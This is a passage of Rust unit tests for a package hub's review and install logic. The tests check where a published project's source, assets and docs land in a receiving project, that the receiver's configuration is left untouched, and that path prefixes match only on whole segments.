                     "size_bytes": HUB_LAYOUT_PAGE.len(), "reason": "page",
                     "content": HUB_LAYOUT_PAGE}
                ]
            }
        });
        let payload = parse_hub_artifact_value(document, "TEST_HUB").expect("a v1 document");
        assert!(
            payload.layout.is_none(),
            "the fixture is only interesting while it declares nothing"
        );

        let review = platform
            .hub
            .review_artifact_payload(
                "superadmin",
                "atlas",
                "legacy-tools",
                "1.0.0",
                "",
                &payload,
                &no_channel(),
            )
            .expect("review");
        assert_eq!(
            reviewed_destinations(&review),
            vec![
                "src/hub/legacy-tools/blog/feed.zf.json".to_string(),
                "src/hub/legacy-tools/pages/feed.tsx".to_string(),
            ]
        );

        platform
            .hub
            .install_artifact_payload_from(
                "superadmin".to_string(),
                "atlas".to_string(),
                "legacy-tools",
                "1.0.0",
                "",
                "local/legacy-tools",
                payload,
                &no_channel(),
            )
            .expect("install");
        for destination in reviewed_destinations(&review) {
            assert!(target.repo_dir.join(&destination).is_file());
        }
    }

    /// Adding a whole project from inside another one. Its source lands in the
    /// receiver's source root, its images where the receiver serves images
    /// from, and its docs where the receiver keeps docs -- each under the same
    /// folder name, so an uninstall knows every place to look.
    #[test]
    fn a_whole_project_added_as_a_folder_lands_in_the_receivers_areas() {
        let (_root, platform) = hub_publish_fixture("Calculator One");
        write_spatial_blogging_source(&platform);
        publish_spatial_blogging(&platform, "project_files", ".", "spatial-blogging");
        let target = project_declaring_src(&platform, "atlas");
        let target_configuration =
            std::fs::read(target.project_config_file.as_path()).expect("target configuration");

        let package = "calc-studio.spatial-blogging";
        let review = platform
            .hub
            .review_asset_install("superadmin", "atlas", package, "1.0.0", "")
            .expect("review");
        let destinations = reviewed_destinations(&review);

        let result = platform
            .hub
            .install_asset("superadmin", "atlas", package, "1.0.0", "")
            .expect("install");

        let folder = format!("hub/{package}");
        assert_eq!(result.install_root, format!("src/{folder}"));
        assert!(
            destinations.contains(&format!("src/{folder}/blog/feed.zf.json")),
            "source keeps the receiver's source root: {destinations:?}"
        );
        assert!(
            destinations.contains(&format!("src/assets/{folder}/logo.svg")),
            "assets land where the receiver serves assets from: {destinations:?}"
        );
        assert!(
            destinations.contains(&format!("docs/{folder}/README.md")),
            "docs land where the receiver keeps docs: {destinations:?}"
        );
        // The publisher's own project configuration is not an area of the
        // receiver's layout, so it stays inside the package's folder. Writing
        // it at the canonical path would replace the receiver's own.
        assert!(destinations.contains(&format!(
            "src/{folder}/{}",
            crate::contracts::kinds::PROJECT_CONFIGURATION_FILE
        )));
        assert_eq!(
            std::fs::read(target.project_config_file.as_path()).expect("target configuration"),
            target_configuration,
            "adding a project must not rewrite the receiver's configuration"
        );

        // The review and the install are one answer, not two that happen to
        // agree: every destination shown exists, and the pipeline the review
        // said would be registered is the identity the install registered.
        for destination in &destinations {
            assert!(
                target.repo_dir.join(destination).is_file(),
                "the review promised {destination}"
            );
        }
        assert_eq!(result.pipelines_registered, review.pipelines_registered);
        assert_eq!(
            result.pipelines_registered,
            vec![format!("{folder}/blog/feed.zf.json")]
        );
        assert!(
            platform
                .projects
                .read_pipeline_source(
                    "superadmin",
                    "atlas",
                    &format!("{folder}/blog/feed.zf.json")
                )
                .expect("the added pipeline is registered")
                .contains("\"feed\"")
        );
    }

    /// Translation is per area, and a path in no area is left alone. The two
    /// singular documents -- the schema exports and the node interface
    /// directory -- are deliberately not translated: one project holds one of
    /// each, so a second copy cannot merge and must not overwrite.
    #[test]
    fn placement_translates_the_areas_it_can_merge_and_leaves_the_rest() {
        let publisher = ZebflowJsonLayout {
            source: Some("pipelines".to_string()),
            ..Default::default()
        }
        .resolve();
        let target = ZebflowJsonLayout {
            source: Some("src".to_string()),
            docs: Some("documentation".to_string()),
            ..Default::default()
        }
        .resolve();
        let placement = HubInstallPlacement::Project {
            publisher,
            target,
            install_root: "src/hub/demo".to_string(),
            folder: "hub/demo".to_string(),
        };

        assert_eq!(
            placement.destination("pipelines/blog/feed.zf.json"),
            "src/hub/demo/blog/feed.zf.json"
        );
        assert_eq!(
            placement.destination("pipelines/assets/logo.svg"),
            "src/assets/hub/demo/logo.svg"
        );
        assert_eq!(
            placement.destination("docs/README.md"),
            "documentation/hub/demo/README.md"
        );
        assert_eq!(
            placement.destination("schemas/sekejap/schema.json"),
            "src/hub/demo/schemas/sekejap/schema.json"
        );
        assert_eq!(
            placement.destination("nodes/n.x.acme.thing.json"),
            "src/hub/demo/nodes/n.x.acme.thing.json"
        );
        assert_eq!(
            placement.destination("zebflow.yaml"),
            "src/hub/demo/zebflow.yaml"
        );
        // `pipelines-old` is not inside `pipelines`; the prefix is anchored on
        // a whole segment so a neighbouring directory is not swallowed.
        assert_eq!(
            placement.destination("pipelines-old/feed.zf.json"),
            "src/hub/demo/pipelines-old/feed.zf.json"
        );
    }

    /// Omitted flags mean the install this caller always got.
    #[test]
    fn an_install_request_that_names_no_flags_installs_everything() {
        let scope: HubInstallScope = serde_json::from_str("{}").expect("an empty scope body");
        assert_eq!(scope, HubInstallScope::default());
        assert!(scope.include_code && scope.include_schema && scope.execute_schema);
    }
}
